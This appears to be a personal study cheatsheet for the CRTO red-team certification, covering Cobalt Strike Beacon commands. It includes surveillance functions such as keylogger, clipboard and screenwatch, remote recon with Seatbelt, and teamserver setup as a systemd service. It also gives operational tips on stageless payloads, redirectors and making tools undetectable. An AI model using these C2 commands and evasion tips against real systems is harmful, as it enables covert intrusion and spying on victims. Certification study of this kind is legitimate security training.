+++
date = "2025-01-27"
title = "CRTO Cheatsheet"
description = "CRTO Cheatsheet"
author = "Javier Olmedo"
toc = true
+++

# Top commands 🥇
---
## CobaltStrike 🥷
---
```bash
# Basics
sleep <seconds> <jitter> # sleep 5 50 -> slee time between 2.5 y 7.5
execute-assembly <path_tool> <params_tool> # Execute binary on remote Beacon -> execute-assembly /var/www/html/Seatbelt.exe -group=system


# Recon
net logons
clipboard
keylogger 
printscreen
screenshot
screenwatch

# DNS Beacon
checkin # Get metadata/info Beacon
```
### How to run TeamServer 🏃‍♂️
---
#### Manual ✍️
---
```bash
sudo ./teamserver <ip> <password> <c2_profile> <kill_date> # 192.100.1.1 MyPassword! /opt/c2.profile 2025-12-31
```
#### Running as a service ⚙️
---
```bash
sudo nano /etc/systemd/system/teamserver.service
```

```txt
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/opt/cobaltstrike/Server
ExecStart=/opt/cobaltstrike/Server/teamserver <ip> <password> <c2_profile> <kill_date>

[Install]
WantedBy=multi-user.target
```

https://github.com/0xBeacon/Cobalt-Strike-as-a-Service/blob/main/setup.sh
#### Start and Stop 🟢🔴
---
Reload `systemd manager` 🔄
```sh
sudo systemctl daemon-reload
sudo systemctl status teamserver.service # It wil be inactive/dead
```

Start service 🟢
```sh
sudo systemctl start teamserver.service # Only start service
sudo systemctl enable teamserver.service # Enable service on boot
```

Stop service 🔴
```bash
sudo systemctl stop teamserver.service # Only start service
sudo systemctl disable teamserver.service # Enable service on boot
```

Get status service ℹ️
```sh
sudo systemctl status teamserver.service
```
### Profiles examples 👤
---
```bash
# Add this on profile
set sleeptime "5000";
set jitter "50";
```
## Seatbelt
---
```bash
# Pending to make it FUD when compiling
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system -outputfile="c:\users\public\seatbelt.txt" # group -> all,user

# Remote
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=remote -computername=<computer.domain.com> -username=<domain\user> -password=<password> -outputfile="c:\users\public\seatbelt.txt"
```
## SharPersist
---
```bash

```
# TIPs 💡
```
recomendado lanzar el teamserver en una sesión de tmux
siempre usar stageless
no usar en teamserver a internet, siempre detras de un redirector
```

# Cheatsheets
---
- https://hackmd.io/@_1PdHqbfSHyQw7PmiDCzEg/SyIQaTmIi

# Repositorios 📦
---
- https://github.com/h3ll0clar1c3/CRTO